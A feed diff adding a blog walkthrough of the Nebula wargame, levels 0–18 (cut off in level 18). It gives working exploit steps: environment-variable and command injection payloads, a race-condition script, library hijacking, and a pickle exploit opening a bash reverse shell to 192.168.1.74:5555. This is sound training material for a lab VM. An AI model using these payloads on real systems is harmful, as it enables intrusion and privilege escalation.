@@ -4,7 +4,7 @@
   <title><![CDATA[forelsec]]></title>
   <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2014-03-04T20:18:42-07:00</updated>
+  <updated>2014-03-04T23:05:46-07:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -3520,6 +3520,1263 @@ It&rsquo;s also of interest that none of this code verifies the authenticity of 
 
 
 <p>Overall these levels were pretty basic, but I&rsquo;m looking forward to digging into Fusion for more advanced flags.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Nebula Solutions - All Levels]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/03/30/nebula-solutions-all-levels/"/>
+    <updated>2013-03-30T23:46:33-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/03/30/nebula-solutions-all-levels</id>
+    <content type="html"><![CDATA[<p>Nebula is the first of three exploit discs provided by <a href="http://exploit-exercises.com/">exploit exercises</a>.  I&rsquo;ve seen a couple walkthroughs of these levels around, but as a completionist, and for future reference, I&rsquo;ve cleaned my notes up a bit and am posting them here.  I will also post my notes for the other two systems sometime after.  This post includes a walkthrough of all 20 levels.</p>
+
+<h3>Level 00</h3>
+
+
+<p>Introduction level; requires the user to find a setuid file.  <code>find / -perm +6000 -type f -exec ls -ldh {} \; &gt; files.txt</code> and <code>cat files.txt | grep flag00</code> gives us two files, <code>/bin/.../flag00</code> and <code>/rofs/bin/.../flag00</code>.  Pick one and get your flag.</p>
+
+<h3>Level 01</h3>
+
+
+<p>First &ldquo;real&rdquo; level.  A binary with an environmental vulnerability; the source code given clearly lays out that its loading the users environment, and running echo with a string.  By modifying our environmental PATH, we can &ldquo;search&rdquo; for echo first in another directory and launch a shell.  <code>export PATH=/tmp:$PATH</code> to search for binaries in /tmp first, then create a shell script that launches bash.  Flag captured.</p>
+
+<h3>Level 02</h3>
+
+
+<p>Much like the previous level, this involves the manipulation of environmental variables.  Here it&rsquo;s pulling <code>$USER</code> and inserting it into a string to echo out.  Because we control this variable, we can terminate the string and execute a shell with the following: <code>export USER="test &amp;&amp; /bin/bash &amp;&amp; echo"</code>.  Launch the binary and capture the flag.</p>
+
+<h3>Level 03</h3>
+
+
+<p>This level has a crontab that runs every 5 minutes, and executes anything found in the local <code>writable.d</code> folder, then removes it.  It, surprise, runs as our flag.  If we shove a malicious script into the run folder that generates a shell executable for us, we should be able to suid it and capture our flag.  Generate a shell script with the following in writable.d:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/bash
+</span><span class='line'>
+</span><span class='line'>gcc /tmp/shell.c -o /home/flag03/shell
+</span><span class='line'>chmod +s /home/flag03/shell</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You&rsquo;ll just need to create <code>shell.c</code> in tmp and wait for it to run; I took the source code from level 1 and changed the system command to execute /bin/bash instead.  Execute <code>chmod +x</code> on run.sh and wait for your binary to be generated.  Once it is, execute it for your flag.  One thing to note is that it would be much easier to echo a shell script and suid that; alas, Linux prevents us from suid&#8217;ing scripts, <a href="http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html">and for very good reason</a>.</p>
+
+<h3>Level 04</h3>
+
+
+<p>Here we have another executable binary and a token file, which we must read.  The binary reads a name from stdin, checks if it&rsquo;s called &ldquo;token&rdquo; and if so, exits, otherwise it reads the file.  To circumvent this simple test, we can create a symbolic link to the token file and read that instead.  Executing <code>ln -s /home/flag04/token /tmp/test</code> allows us to then read /tmp/test and dump the token file.  In it is the password for flag04.</p>
+
+<h3>Level 05</h3>
+
+
+<p>This level aims to educate the user on directory permissions.  Browsing to <code>/home/flag05</code> and <code>ls -lAh</code> gives us several hidden folders, including a .backup folder with a tar file.  If we untar this, it appears to be a backup of flag05&rsquo;s ssh directory.  Copying the private key over will allow us to SSH in and capture our fifth flag.</p>
+
+<h3>Level 06</h3>
+
+
+<p>The informational page notes that this flag&rsquo;s credentials came from a legacy Unix system.  Executing <code>cat /etc/passwd | grep flag06</code> gives us a traditional DES encrypted password.  Loading this into john the ripper cracks the flag&rsquo;s password, giving us our sixth flag.</p>
+
+<h3>Level 07</h3>
+
+
+<p>Level 7 has a web server running on port 7007 that hosts a simple ping application.  No sanitation is performed on input, so obviously its prone to injection.  Leveraging the shell we wrote for level 3, we can simply generate a new shell script to compile and suid the binary.  By setting Host equal to <code>192.168.1.1 | sh /tmp/run2.sh</code>, we&rsquo;ll generate our shell and capture the flag.</p>
+
+<h3>Level 08</h3>
+
+
+<p>This level has a single pcap file with, likely. a password somewhere.  I scp&rsquo;d this off so I could parse it in Wireshark, but it could also be done using <code>tcpdump -qns 0 -X -r capture.pcap | more</code>.  Opening the pcap gives us a login attempt with a password backdoor&hellip;00Rm8.ate.  The periods are represented by <code>\x7f</code>, which just so happens to be backspace.  su to flag08 and capture the flag.</p>
+
+<h3>Level 09</h3>
+
+
+<p>This level requires some prerequisite knowledge of PHP and an edge-case vulnerability.  When <a href="http://php.net/manual/en/function.preg-replace.php">pre_replace</a> is used with the /e flag, the replacement string is substituted, evaluated, and replaced in the original string.  By looking at the PHP source code, we see the following <code>$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);</code>.  This regex matches the pattern <code>[email EMAIL]</code>, where EMAIL will be evaluated by the spam function, then eval&rsquo;d by PHP.  Notice the function takes two arguments, but only uses one; a clue, by any means.</p>
+
+<p>In order to exploit this, we need to set the email portion of the regex to spawn us a shell.  This can be done with the following entry: <code>([email {${system($use_me)}}])</code>, where $use_me is $argv[2] to the executable.  Wrapping the command in <code>${system}</code> allows the PHP engine to interpret the command properly, and the extra pair of curly braces for escaping.  Pass in /bin/bash to capture your flag.</p>
+
+<h3>Level 10</h3>
+
+
+<p>Level 10 introduces a bit of networking; an application binary exists in the flag&rsquo;s folder, which reads a file and host from stdin and sends the file to the host over port 18211.  The binary first makes a call to access() to verify the user has adequate privileges; if not, a connection to the remote host is made and the file sent.  The vulnerability is a classic TOCTTOU (time of check to time of use); the application first checks if the user has access, then goes about creating a socket, making the connection, and sending the header.  With the following script, we can brute force the race condition:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/bash
+</span><span class='line'>
+</span><span class='line'>unlink /tmp/token
+</span><span class='line'>touch /tmp/token
+</span><span class='line'>/home/flag10/flag10 /tmp/token 192.168.1.74 &
+</span><span class='line'>rm -f /tmp/token
+</span><span class='line'>ln -s /home/flag10/token /tmp/token</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I then started up a netcat listener on my remote host.  After about 30-40 iterations, I had flag 10&rsquo;s password.</p>
+
+<h3>Level 11</h3>
+
+
+<p>This is our first tricky level, I thought, that required a bit of leg work and thought.  The instructions state there are two ways to finish this level; I&rsquo;m assuming that&rsquo;s through one of two code paths present in the binary.  Essentially if our content header is &lt; 1024 we take the first transformation path, and if it&rsquo;s > 1024, we take the second.  The objective is to pass in already encrypted data that, when decrypted, can grab our flag.  If we send in encrypted data after a 1024 byte buffer, we can get decrypted commands to the system() call.  I wrote a small C application that runs the exact runtime from the given source and spits to stdout, which can then be piped to flag11 <code>./generate getflag | /home/flag11/flag11</code>.</p>
+
+<h3>Level 12</h3>
+
+
+<p>This level has a local telnet script listening on port 50001 that employs a lua script to handle all of its happenings.  The script accepts a password, hashes it, and checks it against a hard coded hash.  The vulnerability here is how it&rsquo;s actually verifying the password; the following line exemplifies the issue: <code>prog = io.popen("echo "..password.." | sha1sum", "r")</code>.  The listener receives input, and echo&rsquo;s it into sha1sum.  If we inject commands into our password, we should be able to snag the flag.  Executing <code>f | getflag &gt; /tmp/test | echo "test"</code> as a password should result in our flag when you <code>cat /tmp/test</code>.</p>
+
+<h3>Level 13</h3>
+
+
+<p>I was initially a little confused about the goal for this level; <code>cat /etc/passwd | grep 1000</code> returned the nebula account, which we &ldquo;technically&rdquo; don&rsquo;t know.  I then started looking for ways to preload a modified library, so we could override the getuid() call and just return 1000.  This led me <a href="http://www.ibm.com/developerworks/library/l-glibc/index.html">here</a>, which I was painlessly able to pull off:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level13@nebula: cat moduid.c
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>uid_t getuid(){ return 1000; }
+</span><span class='line'>level13@nebula: gcc -shared -o moduid.so moduid.c
+</span><span class='line'>level13@nebula: LD_PRELOAD=moduid.so ./flag13</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Running this dumps our token to stdout.  Another method may be modifying the binary itself, but I don&rsquo;t know how legal that is.  This was a neat vulnerability, and something I haven&rsquo;t run into before.</p>
+
+<h3>Level 14</h3>
+
+
+<p>Now I&rsquo;m convinced that running the binaries in a debugger is legal.  This level has a binary that only encrypts information; so, the objective here is to discover the encryption algorithm and write a complimentary decryption routine.  Playing around with the encryption tool allowed me to quickly discover what it was doing, without having to delve into assembly:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>abcdefg -&gt; acegikm
+</span><span class='line'>a -&gt; a (idx + 0)
+</span><span class='line'>b -&gt; c (idx + 1)
+</span><span class='line'>c -&gt; e (idx + 2)
+</span><span class='line'>d -&gt; g (idx + 3)
+</span><span class='line'>e -&gt; i (idx + 4)
+</span><span class='line'>f -&gt; k (idx + 5)
+</span><span class='line'>g -&gt; m (idx + 6)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So to reverse this, we just need to subtract the index.  I wrote a quick python script for doing this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import sys
+</span><span class='line'>
+</span><span class='line'>def decrypt(args):
+</span><span class='line'>    ciph = args[2]
+</span><span class='line'>    plain = ''
+</span><span class='line'>    print 'Decrypting ', ciph
+</span><span class='line'>    for idx in xrange(len(ciph)):
+</span><span class='line'>        tmp = (ord(ciph[idx])-65)-idx
+</span><span class='line'>        plain += chr(tmp+65)
+</span><span class='line'>    print 'Decrypted: ', plain
+</span><span class='line'>
+</span><span class='line'>def encrypt(args):
+</span><span class='line'>    plain = args[2]
+</span><span class='line'>    ciph = ''
+</span><span class='line'>    print 'Encrypting ', plain
+</span><span class='line'>    for idx in xrange(len(plain)):
+</span><span class='line'>        tmp = (ord(plain[idx])-65)+idx
+</span><span class='line'>        ciph += chr(tmp+65)
+</span><span class='line'>    print 'Encrypted: ', ciph
+</span><span class='line'>
+</span><span class='line'>if len(sys.argv) &lt; 2:
+</span><span class='line'>    print '%s: [-d] [cipher] [-e] [plain]'%sys.argv[0]
+</span><span class='line'>    sys.exit(1)
+</span><span class='line'>
+</span><span class='line'>if '-d' in sys.argv:
+</span><span class='line'>    decrypt(sys.argv)
+</span><span class='line'>elif '-e' in sys.argv:
+</span><span class='line'>    encrypt(sys.argv)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we just need to pass in the output of the encrypted token file to obtain our flag.</p>
+
+<h3>Level 15</h3>
+
+
+<p>If we strace flag15, we see a ton of access attempts to libc.so.6 in various folders in <code>/var/tmp/flag15</code>.  My first idea was to forgo the libc loading stuff and try wrapping the puts call and use the preload vulnerability again:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/tmp$ cat wrapper.c
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>
+</span><span class='line'>int __wrap_puts(const char *s){
+</span><span class='line'>    system("/bin/getflag &gt; /tmp/flagged");
+</span><span class='line'>    return puts(s);
+</span><span class='line'>}
+</span><span class='line'>level15@nebula:/tmp$ gcc -Wl,-wrap,write -shared -o /tmp/wrapper.so /tmp/wrapper.c
+</span><span class='line'>level15@nebula:/tmp$ LD_PRELOAD=/tmp/wrapper.so ./flag15</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Unfortunately, the protection mechanism for preloading libraries catches us.  The loader will completely ignore the preloaded library if the RUID is not equal to the EUID and unlike level 13, we need to execute a binary, not simply obtain a token embedded in the binary.</p>
+
+<p>So instead we need to compile a statically linked library and get it to call that library with whatever function it&rsquo;s using.  Object dumping the file, we find our main quite small:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/home/flag15$ objdump -d -M intel flag15 
+</span><span class='line'>[....]
+</span><span class='line'>08048330 &lt;main&gt;:
+</span><span class='line'> 8048330:  55                     push   %ebp
+</span><span class='line'> 8048331:  89 e5                  mov    %esp,%ebp
+</span><span class='line'> 8048333:  83 e4 f0               and    $0xfffffff0,%esp
+</span><span class='line'> 8048336:  83 ec 10               sub    $0x10,%esp
+</span><span class='line'> 8048339:  c7 04 24 d0 84 04 08   movl   $0x80484d0,(%esp)
+</span><span class='line'> 8048340:  e8 bb ff ff ff         call   8048300 &lt;puts@plt&gt;
+</span><span class='line'> 8048345:  c9                     leave  
+</span><span class='line'> 8048346:  c3                     ret    
+</span><span class='line'> 8048347:  90                     nop</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The only function it calls is puts, so we need to override that; we also need a target location.  <code>/var/tmp/flag15/libc.so.6</code> appears to be the least nested.  Here&rsquo;s the library code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/home/flag15$ cat /tmp/lib.c
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>
+</span><span class='line'>int puts(const char *s){
+</span><span class='line'>  system("/bin/getflag &gt; /tmp/flagged");
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int __libc_start_main(int (*main)(int, char **, char **), 
+</span><span class='line'>           int argc, char **argv,
+</span><span class='line'>          void (*init)(void),
+</span><span class='line'>          void (*fini)(void),
+</span><span class='line'>          void (*rtld_fini)(void),
+</span><span class='line'>          void (*stack_end))
+</span><span class='line'>    { main(argc, argv, NULL);
+</span><span class='line'>  return 0;
+</span><span class='line'>}
+</span><span class='line'>level15@nebula:/home/flag15$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>We just need to compile and statically link this to the library path:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/home/flag15$ gcc -Wall -fPIC -o /tmp/libc.o -c /tmp/lib.c
+</span><span class='line'>/tmp/lib.c: In function ‘puts’:
+</span><span class='line'>/tmp/lib.c:6:1: warning: control reaches end of non-void function [-Wreturn-type]
+</span><span class='line'>level15@nebula:/home/flag15$ gcc -shared -W1,-Bstatic,-soname,libc.so.6 -o /var/tmp/flag15/libc.so.6 /tmp/libc.o -static
+</span><span class='line'>level15@nebula:/home/flag15$ ./flag15
+</span><span class='line'>./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
+</span><span class='line'>./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
+</span><span class='line'>./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __deregister_frame_info, version GLIBC_2.0 not defined in file libc.so.6 with link time reference</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This, <a href="http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker">apparently</a>, means that the library version number is lower on the shared object.  So we&rsquo;ll need to generate a version file and link it in:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/home/flag15$ cat /tmp/versionz 
+</span><span class='line'>GLIBC_2.0{
+</span><span class='line'>  __cxa_finalize;
+</span><span class='line'>  __libc_start_main;
+</span><span class='line'>  puts;
+</span><span class='line'>};
+</span><span class='line'>GLIBC_2.1.3 {
+</span><span class='line'>}GLIBC_2.0;
+</span><span class='line'>
+</span><span class='line'>GLIBC_2.4{
+</span><span class='line'>}GLIBC_2.0;
+</span><span class='line'>level15@nebula:/home/flag15$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Recompile with &mdash;version-script=/tmp/versionz and&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/home/flag15$ ./flag15
+</span><span class='line'>Segmentation fault
+</span><span class='line'>level15@nebula:/home/flag15$ cat /tmp/flagged
+</span><span class='line'>You have successfully executed getflag on a target account
+</span><span class='line'>level15@nebula:/home/flag15$</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<h3>Level 16</h3>
+
+
+<p>Level 16 has an HTTP server that hosts a simple CGI script.  In it, it parses off two parameters (username &amp; password) from the URL, then the username is converted to uppercase and everything after a space is stripped.  It then uses it as an argument to egrep:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>@output = `egrep "^$username" /home/flag16/userdb.txt 2&gt;&1`;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This level took a bit of thought and a frustrating amount of tinkering; it&rsquo;s obvious where the vulnerability is, but it&rsquo;s not so obvious what we actually need to do.  All input is run through the two filters, so we&rsquo;ll need to either send in post-manipulated data that will be changed back when run, or some other voodoo that&rsquo;ll correctly be interpreted by bash and not touched by the filters.</p>
+
+<p>The easiest, and shortest, command will be a script.  Normally, you wouldn&rsquo;t have access to the underlying host, but we do, so for now we&rsquo;ll take advantage of it.  I&#8221;ll admit I spent more time Googling around for this one than any of the previous; I happened to stumble into <a href="http://serverfault.com/questions/221318/bash-wildcard-expansion">this</a> Stack Overflow post about bash wildcard expansion:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level16@nebula:~$ pwd
+</span><span class='line'>/tmp
+</span><span class='line'>level16@nebula:~$ ls
+</span><span class='line'>SHELL
+</span><span class='line'>level16@nebula:~$ ls /*/SHELL
+</span><span class='line'>/tmp/SHELL</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Wildcards aren&rsquo;t anything new, but I never knew that you could use it as such.  This means we need to have our username evaluated as <code>/*/shell</code>, so when it&rsquo;s expanded it&rsquo;ll be <code>/tmp/SHELL</code>.  The final result:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.206:1616/index.cgi?username=%22%60%2f*%2fshell%60%22&password=dolphin</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Add in a netcat call back to a script SHELL in tmp (see level 17) and it&rsquo;s game over.</p>
+
+<h3>Level 17</h3>
+
+
+<p>This level is yet another vulnerable listener, this time implemented in Python.  The vulnerability lies in the Pickle module, where one look at documentation gets you:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Warning The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Because our input is never sanitized, we just need to send a specially crafted input string to be unpickled and execute malicious code.  <a href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">This</a> Blackhat whitepaper came in handy when figuring out how the parsing engine worked, and once I had that figured out it was pretty easy:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
+</span><span class='line'>
+</span><span class='line'>cmd = "cos\nsystem\n(S'/bin/bash -i &gt; /dev/tcp/192.168.1.74/5555 0&gt;&1'\ntR.\n"
+</span><span class='line'>try:
+</span><span class='line'>    sock = socket.socket()
+</span><span class='line'>    sock.connect(('192.168.1.206', 10007))
+</span><span class='line'>    data = sock.recv(512)
+</span><span class='line'>    print 'Got: ', data
+</span><span class='line'>    sock.send(cmd)
+</span><span class='line'>    sock.close()
+</span><span class='line'>except Exception, e: print e</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I had a netcat shell listening on port 5555 for the call back.  I used this method because the Nebula box doesn&rsquo;t have netcat-traditional on it, which lacks the -e flag.  This is a neat way of opening a reverse shell without the fuss of named pipes.</p>
+
+<h3>Level 18</h3>
+
+
+<p>According to the level documentation, this can be completed in three different ways at three different difficulty levels.  The binary appears to be a hackney attempt at some sort of login program; with it, a user can &ldquo;login&rdquo; to elevate privileges, set user, do some debugging, and some other smaller things.  Immediately though I see a buffer overflow:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ ./flag18
+</span><span class='line'>setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>*** buffer overflow detected ***: ./flag18 terminated
+</span><span class='line'>======= Backtrace: =========
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xdbd8d5]
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0xdbc6d7]
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0xdbbd35]
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0xd41f91]
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0xd19305]
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0xdbbe09]
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0xdbbd1f]
+</span><span class='line'>./flag18[0x8048df5]
+</span><span class='line'>./flag18[0x8048b1b]
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xcef113]
+</span><span class='line'>./flag18[0x8048bb1]
+</span><span class='line'>======= Memory map: ========
+</span><span class='line'>00324000-00325000 r-xp 00000000 00:00 0          [vdso]
+</span><span class='line'>00358000-00376000 r-xp 00000000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
+</span><span class='line'>00376000-00377000 r--p 0001d000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
+</span><span class='line'>00377000-00378000 rw-p 0001e000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
+</span><span class='line'>00c9b000-00cb7000 r-xp 00000000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
+</span><span class='line'>00cb7000-00cb8000 r--p 0001b000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
+</span><span class='line'>00cb8000-00cb9000 rw-p 0001c000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
+</span><span class='line'>00cd6000-00e4c000 r-xp 00000000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
+</span><span class='line'>00e4c000-00e4e000 r--p 00176000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
+</span><span class='line'>00e4e000-00e4f000 rw-p 00178000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
+</span><span class='line'>00e4f000-00e52000 rw-p 00000000 00:00 0 
+</span><span class='line'>08048000-0804a000 r-xp 00000000 07:00 12922      /home/flag18/flag18
+</span><span class='line'>0804a000-0804b000 r--p 00001000 07:00 12922      /home/flag18/flag18
+</span><span class='line'>0804b000-0804c000 rw-p 00002000 07:00 12922      /home/flag18/flag18
+</span><span class='line'>082c5000-082e6000 rw-p 00000000 00:00 0          [heap]
+</span><span class='line'>b77a8000-b77a9000 rw-p 00000000 00:00 0 
+</span><span class='line'>b77b1000-b77b4000 rw-p 00000000 00:00 0 
+</span><span class='line'>bfabf000-bfae0000 rw-p 00000000 00:00 0          [stack]
+</span><span class='line'>Aborted
+</span><span class='line'>level18@nebula:/home/flag18$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>I guess not.  It appears it&rsquo;s been compiled with a bit of protection:</p>
+
